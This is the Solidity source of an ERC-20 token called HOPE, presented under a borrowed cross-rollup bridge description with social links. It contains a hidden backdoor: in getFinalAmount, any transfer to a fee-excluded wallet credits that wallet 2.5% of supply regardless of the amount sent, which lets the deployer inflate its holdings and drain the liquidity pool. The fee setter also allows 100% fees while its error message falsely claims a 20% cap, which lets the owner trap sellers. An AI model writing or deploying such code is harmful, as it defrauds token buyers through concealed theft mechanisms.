// SPDX-License-Identifier: MIT

/*
A protocol for sending tokens across rollups and their shared layer-1 network in a quick and trustless manner

Website: https://www.hopeprotocol.org
Telegram: https://t.me/HopeProtocol
Twitter: https://twitter.com/protocol_hope
*/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract HOPE is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "HOPE";
    string private constant _symbol = "HOPE";

    uint8 private constant _decimals = 9;
    uint256 private _tSupply = 10 ** 9 * 10 ** _decimals;

    IUniswapRouter uniRouterV2;
    address public pair;

    bool private tradingOpen = false;
    bool private swapOpen = true;
    bool private inswap;

    uint256 private tradeCounts;
    uint256 private taxSwapAfter;

    uint256 private _swapMaxAmt = ( _tSupply * 1000 ) / 100000;
    uint256 private _swapMinAmt = ( _tSupply * 10 ) / 100000;
    
    uint256 private _lpDivi = 0;
    uint256 private _mkDivi = 0;
    uint256 private _burnDivi = 0;
    uint256 private _devDivi = 100;

    uint256 private buyFee = 1500;
    uint256 private sellFee = 1500;
    uint256 private transferFee = 1500;
    uint256 private denominator = 10000;

    modifier lockEnter {inswap = true; _; inswap = false;}

    address internal developAddress = 0x4AE2A538dDE04165a9DaB8dB530015064923CdFA; 
    address internal marketAddress = 0x4AE2A538dDE04165a9DaB8dB530015064923CdFA;
    address internal lpFeeAddress = 0x4AE2A538dDE04165a9DaB8dB530015064923CdFA;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private _maxTrnx = ( _tSupply * 250 ) / 10000;
    uint256 private _maxBuy = ( _tSupply * 250 ) / 10000;
    uint256 private _maxWallet = ( _tSupply * 250 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludeFromFees;

    constructor() Ownable(msg.sender) {
        IUniswapRouter _router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        uniRouterV2 = _router; pair = _pair;

        isExcludeFromFees[lpFeeAddress] = true;
        isExcludeFromFees[developAddress] = true;
        isExcludeFromFees[msg.sender] = true;
        isExcludeFromFees[marketAddress] = true;
        _balances[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, _tSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}

    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _tSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        _lpDivi = _liquidity; _mkDivi = _marketing; _burnDivi = _burn; _devDivi = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function startTrading() external onlyOwner {tradingOpen = true;}

    function getFinalAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludeFromFees[recipient]) {return _maxTrnx;}
        if(getBuySellFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getBuySellFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(_burnDivi > uint256(0) && getBuySellFees(sender, recipient) > _burnDivi){_transfer(address(this), address(DEAD), amount.div(denominator).mul(_burnDivi));}
        return amount.sub(feeAmount);} return amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _tSupply.mul(_buy).div(10000); uint256 newTransfer = _tSupply.mul(_sell).div(10000); uint256 newWallet = _tSupply.mul(_wallet).div(10000);
        _maxTrnx = newTx; _maxBuy = newTransfer; _maxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function shouldSwapTokensInCa(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _swapMinAmt;
        bool aboveThreshold = balanceOf(address(this)) >= _swapMaxAmt;
        return !inswap && swapOpen && tradingOpen && aboveMin && !isExcludeFromFees[sender] && recipient == pair && tradeCounts >= taxSwapAfter && aboveThreshold;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpFeeAddress,
            block.timestamp);
    }

    function getBuySellFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludeFromFees[sender] && !isExcludeFromFees[recipient]){require(tradingOpen, "tradingOpen");}
        if(!isExcludeFromFees[sender] && !isExcludeFromFees[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWallet, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxBuy || isExcludeFromFees[sender] || isExcludeFromFees[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTrnx || isExcludeFromFees[sender] || isExcludeFromFees[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcludeFromFees[sender]){tradeCounts += uint256(1);}
        if(shouldSwapTokensInCa(sender, recipient, amount)){swapBackTokensInCa(_swapMaxAmt); tradeCounts = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = amount;
        if (!isExcludeFromFees[sender]) {amountReceived = getFinalAmount(sender, recipient, amount);}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function swapBackTokensInCa(uint256 tokens) private lockEnter {
        uint256 _denominator = (_lpDivi.add(1).add(_mkDivi).add(_devDivi)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(_lpDivi).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(_lpDivi));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(_lpDivi);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(_mkDivi);
        if(marketingAmt > 0){payable(marketAddress).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(developAddress).transfer(contractBalance);}
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterV2.WETH();
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}